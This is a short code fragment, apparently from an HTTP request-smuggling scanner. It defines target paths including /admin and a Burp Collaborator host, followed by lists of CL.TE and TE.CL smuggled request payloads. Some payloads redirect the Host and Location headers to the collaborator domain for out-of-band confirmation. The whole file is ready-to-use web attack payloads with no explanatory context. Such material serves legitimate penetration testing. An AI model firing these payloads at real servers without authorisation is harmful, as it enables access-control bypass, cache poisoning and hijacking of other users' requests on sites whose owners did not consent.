smuggle_dir=["/robots.txt","/please404","/%0C","/admin"]
RN="\r\n"
Smuggled_Host=".burpcollaborator.net"
Payloads_CLTE=["GET __DIR__ HTTP/__HTTP_VERSION__"+RN+"X:X",

        "GET __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"X:X",

        "GET / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__."+Smuggled_Host+RN+"X:X",

        "GET / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Location: https://"+Smuggled_Host+RN+"X:X"


]


Payloads_TECL=["POST __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"POST / HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__."+Smuggled_Host+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"APOST / HTTP/__HTTP_VERSION__"+RN+"Content-Type: application/x-www-form-urlencoded"+RN+"Content-Length: 15"+RN+RN+"x=1",

"POST __DIR__ HTTP/__HTTP_VERSION__"+RN+"Host: __HOST__"+RN+"Content-Type: application/json"+RN+"Content-Length: 15"+RN+RN+"x=1"
]
